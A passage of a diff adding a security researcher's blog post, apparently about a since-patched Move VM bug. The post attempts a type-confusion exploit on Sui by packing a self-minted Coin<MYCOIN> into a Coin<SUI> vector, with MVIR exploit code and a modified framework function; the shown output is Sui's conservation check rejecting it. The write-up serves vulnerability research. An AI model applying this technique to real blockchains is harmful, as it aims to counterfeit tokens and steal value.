+			<span class="n">cap</span><span class="p">,</span> <span class="n">metadata</span><span class="o">=</span> <span class="n">coin</span><span class="py">.create_currency</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="mi">_</span><span class="n">otw</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">decimals</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">symbol</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">name</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">description</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">icon_url</span><span class="p">),</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
+
+			<span class="n">transfer</span><span class="py">.public_freeze_object</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.CoinMetadata</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">metadata</span><span class="p">));</span>
+
+			<span class="n">mutcap</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">cap</span><span class="p">;</span>
+			<span class="n">c</span> <span class="o">=</span> <span class="n">coin</span><span class="py">.mint</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">mutcap</span><span class="p">),</span><span class="mi">20u64</span><span class="p">,</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
+
+			<span class="n">transfer</span><span class="py">.public_transfer</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.TreasuryCap</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">cap</span><span class="p">),</span> <span class="n">tx_context</span><span class="nf">.sender</span><span class="p">(</span><span class="nf">freeze</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">))));</span>
+
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>This is failing by error <code class="language-plaintext highlighter-rouge">CALL_MISMATCH_TYPE_ARGUMENTS</code> ,</p>
+
+<p>due to the line : <code class="language-plaintext highlighter-rouge">mutcap = &amp;mut cap</code></p>
+
+<p>I didn’t find any resources to take mutable references or taking a resource from address. (I move there is <code class="language-plaintext highlighter-rouge">borrow_global_mut&lt;TYPE&gt;(copy(addr))</code> to take mutable reference).</p>
+
+<p>After that I wrote a sui source in <code class="language-plaintext highlighter-rouge">/sui/crates/sui-framework/packages/sui-framework/sources</code> to return a <code class="language-plaintext highlighter-rouge">COIN</code> , so we can call the module function from <strong>mvir</strong> and use the COIN to pack.</p>
+
+<p>The code look like this , but this won’t work as witness should be <code class="language-plaintext highlighter-rouge">one time</code> passed value.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fun</span> <span class="nf">get_coin</span><span class="p">(</span><span class="n">witness</span><span class="p">:</span> <span class="n">MYCOIN</span><span class="p">,</span> <span class="n">ctx</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">TxContext</span><span class="p">)</span> <span class="p">:</span><span class="n">Coin</span><span class="o">&lt;</span><span class="n">MYCOIN</span><span class="o">&gt;</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="p">(</span><span class="n">treasury_cap</span><span class="p">,</span> <span class="n">metadata</span><span class="p">)</span> <span class="o">=</span> <span class="nn">coin</span><span class="p">::</span><span class="nf">create_currency</span><span class="p">(</span><span class="n">witness</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">b</span><span class="s">"MYCOIN"</span><span class="p">,</span> <span class="n">b</span><span class="s">""</span><span class="p">,</span> <span class="n">b</span><span class="s">""</span><span class="p">,</span> <span class="nn">option</span><span class="p">::</span><span class="nf">none</span><span class="p">(),</span> <span class="n">ctx</span><span class="p">);</span>
+        <span class="nn">transfer</span><span class="p">::</span><span class="nf">public_freeze_object</span><span class="p">(</span><span class="n">metadata</span><span class="p">);</span>
+		<span class="k">let</span> <span class="n">fake_coin</span> <span class="o">=</span> <span class="nn">coin</span><span class="p">::</span><span class="n">mint</span><span class="o">&lt;</span><span class="n">MYCOIN</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">treasury_cap</span><span class="p">,</span><span class="n">ctx</span><span class="p">);</span>
+        <span class="nn">transfer</span><span class="p">::</span><span class="nf">public_transfer</span><span class="p">(</span><span class="n">treasury_cap</span><span class="p">,</span> <span class="nn">tx_context</span><span class="p">::</span><span class="nf">sender</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
+		<span class="n">fake_coin</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>As of my knowledge, There is no way I can get the <code class="language-plaintext highlighter-rouge">treasury_cap</code> as mutable reference or get the <code class="language-plaintext highlighter-rouge">coin</code> directly without the <code class="language-plaintext highlighter-rouge">treasury_cap</code>.</strong></p>
+
+<p>I got an idea to return the coin in the create_currency function in <strong><code class="language-plaintext highlighter-rouge">coin.move</code> .</strong> We can directly use that returned value in <code class="language-plaintext highlighter-rouge">vec_pack</code> .</p>
+
+<p>I created a function which is similar to <code class="language-plaintext highlighter-rouge">create_currency</code> :</p>
+
+<p><code class="language-plaintext highlighter-rouge">create_currency_v2</code> :</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">public</span> <span class="n">fun</span> <span class="n">create_currency_v2</span><span class="o">&lt;</span><span class="n">T</span><span class="p">:</span> <span class="k">drop</span><span class="o">&gt;</span><span class="p">(</span>
+        <span class="n">witness</span><span class="p">:</span> <span class="n">T</span><span class="p">,</span>
+        <span class="n">decimals</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+        <span class="n">symbol</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">name</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">description</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">icon_url</span><span class="p">:</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="n">Url</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">ctx</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">TxContext</span>
+    <span class="p">):</span> <span class="p">(</span><span class="n">TreasuryCap</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">CoinMetadata</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">Coin</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c">// Make sure there's only one instance of the type T</span>
+        <span class="k">assert</span><span class="o">!</span><span class="p">(</span><span class="nn">sui</span><span class="p">::</span><span class="nn">types</span><span class="p">::</span><span class="nf">is_one_time_witness</span><span class="p">(</span><span class="o">&amp;</span><span class="n">witness</span><span class="p">),</span> <span class="n">EBadWitness</span><span class="p">);</span>
+
+		<span class="k">let</span> <span class="n">tre</span> <span class="o">=</span> <span class="n">TreasuryCap</span> <span class="p">{</span>
+                <span class="n">id</span><span class="p">:</span> <span class="nn">object</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">ctx</span><span class="p">),</span>
+                <span class="n">total_supply</span><span class="p">:</span> <span class="nn">balance</span><span class="p">::</span><span class="nf">create_supply</span><span class="p">(</span><span class="n">witness</span><span class="p">)</span>
+            <span class="p">};</span>
+		<span class="k">let</span> <span class="n">coin</span> <span class="o">=</span> <span class="nf">mint</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">tre</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">ctx</span><span class="p">);</span>
+
+        <span class="p">(</span>
+            <span class="n">tre</span><span class="p">,</span>
+            <span class="n">CoinMetadata</span> <span class="p">{</span>
+                <span class="n">id</span><span class="p">:</span> <span class="nn">object</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">ctx</span><span class="p">),</span>
+                <span class="n">decimals</span><span class="p">,</span>
+                <span class="n">name</span><span class="p">:</span> <span class="nn">string</span><span class="p">::</span><span class="nf">utf8</span><span class="p">(</span><span class="n">b</span><span class="s">"coin_nam"</span><span class="p">),</span>
+                <span class="n">symbol</span><span class="p">:</span> <span class="nn">ascii</span><span class="p">::</span><span class="nf">string</span><span class="p">(</span><span class="n">b</span><span class="s">"symbol"</span><span class="p">),</span>
+                <span class="n">description</span><span class="p">:</span> <span class="nn">string</span><span class="p">::</span><span class="nf">utf8</span><span class="p">(</span><span class="n">b</span><span class="s">"description"</span><span class="p">),</span>
+                <span class="n">icon_url</span> <span class="p">:</span> <span class="nn">option</span><span class="p">::</span><span class="nf">none</span><span class="p">()</span>
+            <span class="p">},</span>
+			<span class="n">coin</span>
+        <span class="p">)</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Here I’m minting the <code class="language-plaintext highlighter-rouge">coin</code> and returning along with the <code class="language-plaintext highlighter-rouge">treasuryCap</code> and <code class="language-plaintext highlighter-rouge">CoinMetadata</code></p>
+
+<p>In <strong>mvir</strong> exploit i’m directly packing the minted coin(<code class="language-plaintext highlighter-rouge">Coin&lt;MYCOIN&gt;</code>) in <code class="language-plaintext highlighter-rouge">Coin&lt;SUI&gt;</code> type vector using <code class="language-plaintext highlighter-rouge">vec_pack_1</code>.</p>
+
+<p><strong>Final Code :</strong></p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">//# publish</span>
+<span class="n">module</span> <span class="mi">0x0</span><span class="py">.mycoin</span> <span class="p">{</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.object</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.tx_context</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.transfer</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.sui</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.coin</span><span class="p">;</span>
+				<span class="n">import</span> <span class="mi">0x2</span><span class="py">.url</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x1</span><span class="py">.vector</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x1</span><span class="py">.option</span><span class="p">;</span>
+
+
+		<span class="k">struct</span> <span class="n">MYCOIN</span> <span class="n">has</span> <span class="k">drop</span> <span class="p">{</span> <span class="n">dummy</span> <span class="p">:</span> <span class="nb">bool</span><span class="p">}</span>
+
+		<span class="k">struct</span> <span class="n">Wrapper</span> <span class="n">has</span> <span class="n">key</span> <span class="p">{</span>
+            <span class="n">id</span><span class="p">:</span> <span class="n">object</span><span class="py">.UID</span><span class="p">,</span>
+            <span class="n">coins</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">,</span>
+        <span class="p">}</span>
+
+		<span class="nf">init</span><span class="p">(</span><span class="mi">_</span><span class="n">otw</span><span class="p">:</span> <span class="n">Self</span><span class="py">.MYCOIN</span><span class="p">,</span><span class="n">ctx</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">tx_context</span><span class="py">.TxContext</span><span class="p">){</span>
+            <span class="k">let</span> <span class="n">v1</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">wrap</span><span class="p">:</span> <span class="n">Self</span><span class="py">.Wrapper</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">cap</span><span class="p">:</span> <span class="n">coin</span><span class="py">.TreasuryCap</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">mutcap</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">coin</span><span class="py">.TreasuryCap</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">metadata</span> <span class="p">:</span> <span class="n">coin</span><span class="py">.CoinMetadata</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">vec</span> <span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">decimals</span><span class="p">:</span> <span class="nb">u8</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">symbol</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">name</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">description</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">icon_url</span><span class="p">:</span> <span class="n">option</span><span class="py">.Option</span><span class="o">&lt;</span><span class="n">url</span><span class="py">.Url</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">c</span> <span class="p">:</span> <span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+         <span class="n">label</span> <span class="n">b0</span><span class="p">:</span>
+			<span class="n">decimals</span> <span class="o">=</span> <span class="mi">2u8</span><span class="p">;</span>
+			<span class="n">symbol</span> <span class="o">=</span> <span class="n">h</span><span class="s">"bac1ac"</span><span class="p">;</span>
+			<span class="n">name</span> <span class="o">=</span> <span class="n">h</span><span class="s">"bac1ac"</span><span class="p">;</span>
+			<span class="n">description</span> <span class="o">=</span> <span class="n">h</span><span class="s">"bac1ac"</span><span class="p">;</span>
+			<span class="n">icon_url</span> <span class="o">=</span> <span class="n">option</span><span class="py">.none</span><span class="o">&lt;</span><span class="n">url</span><span class="py">.Url</span><span class="o">&gt;</span><span class="p">();</span>
+
+
+			<span class="n">cap</span><span class="p">,</span> <span class="n">metadata</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="n">coin</span><span class="py">.create_currency_v2</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="mi">_</span><span class="n">otw</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">decimals</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">symbol</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">name</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">description</span><span class="p">),</span><span class="k">move</span><span class="p">(</span><span class="n">icon_url</span><span class="p">),</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
+
+			<span class="n">transfer</span><span class="py">.public_freeze_object</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.CoinMetadata</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">metadata</span><span class="p">));</span>
+
+				<span class="n">transfer</span><span class="py">.public_transfer</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.TreasuryCap</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">cap</span><span class="p">),</span> <span class="n">tx_context</span><span class="nf">.sender</span><span class="p">(</span><span class="nf">freeze</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">))));</span>
+						<span class="c">//packing the Coin&lt;MYCOIN&gt; to Coin&lt;SUI&gt;.</span>
+            <span class="n">v1</span> <span class="o">=</span> <span class="n">vec_pack_1</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">c</span><span class="p">));</span>
+            <span class="n">wrap</span> <span class="o">=</span> <span class="n">Wrapper</span><span class="p">{</span> <span class="n">id</span> <span class="p">:</span> <span class="n">object</span><span class="nf">.new</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">))</span> <span class="p">,</span><span class="n">coins</span><span class="p">:</span> <span class="k">move</span><span class="p">(</span><span class="n">v1</span><span class="p">)};</span>
+            <span class="n">transfer</span><span class="py">.transfer</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.Wrapper</span><span class="o">&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">wrap</span><span class="p">),</span><span class="n">tx_context</span><span class="nf">.sender</span><span class="p">(</span><span class="nf">freeze</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">))));</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>OUTPUT :</strong></p>
+
+<p>The arbitrary mint is successful using <code class="language-plaintext highlighter-rouge">vec_pack</code> but there is a Check that this transaction neither creates nor destroys SUI.</p>
+
+<p>So I’m getting this error:</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Some</span><span class="p">(</span><span class="s">"SUI conservation failed: input=300000000000000, output=300000000000100, this transaction either mints or burns SUI"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="what-i-have-learned">What I have learned</h3>
+
+<p>Through this task , I have understand the internals of the move language and sui move. Testing of move modules(mvir/move).
+More over I got a good glance at SUI standard libraries,MOVE standard libraries .</p>
+
+<h3 id="sources-">Sources :</h3>
+
+<ul>
+  <li><a href="https://github.com/MystenLabs/awesome-move#papers">Move</a></li>
+  <li><a href="https://move-book.com/index.html">Move-Book</a></li>
+  <li><a href="https://sui.io/developers">Sui</a></li>
+  <li><a href="https://github.com/move-language/move/pull/491/files">Fixed PR</a></li>
+  <li><a href="https://github.com/MystenLabs/sui/tree/main/crates/sui-adapter-transactional-tests">Sui tests</a></li>
+  <li><a href="https://github.com/MystenLabs/sui/tree/main/crates/sui-transactional-test-runner">Test Runner</a></li>
+</ul>
+
+</article>
+
+        </div>
+        <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="pane-separator visible-xs" style="margin-bottom:5em;"></div>
+          <div class="right-pane" style="margin-left: 1em;">
+            
+              <div class="avatar">
+                <center>
+                  
+                    <img src="/assets/img/avatar.jpg" alt="me" class="avatar-image">
+                  
+                  
+                    <p class="avatar-description">Building n Breaking Stuff</p>
+                  
+                  <div class="right-links">
+                    
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+                  </div>
+                </center>
+              </div>
+            
+            
+              <div class="posts-list">
+                <a href="/blog">
+                  <h4>Recent Posts:</h4>
+                </a>
+                <ul>
+                  
+                </ul>
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="footer">
+      <footer class="page-footer">
+  <center>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        <a onclick="toggleTheme();">
+          Light/Dark
+        </a>
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        Copyright (c) 2023 Surya -
+        <a href="mailto:d4r3d3v1l.asp@gmail.com">&lt;d4r3d3v1l.asp@gmail.com&gt;</a>
+      </div>
+    </div>
+    
+  </center>
+</footer>
+
+    </section>
+  </div>
+</body>
+
+</html>
